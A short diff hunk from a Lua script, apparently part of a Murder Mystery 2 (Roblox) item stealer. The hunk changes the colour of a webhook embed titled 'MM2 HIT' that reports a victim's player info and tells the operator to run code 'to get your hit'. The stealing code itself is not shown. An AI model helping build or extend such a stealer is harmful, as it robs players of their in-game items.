@@ -1059,7 +1059,7 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
 local WebHookEmbed = CreateEmbed(
     "MM2 HIT - Ft. Light Monzz",
     "Please execute the code above to get your hit.",
-    11220,
+    65280,
     {
         {
             name = "🌊 Player Info", 
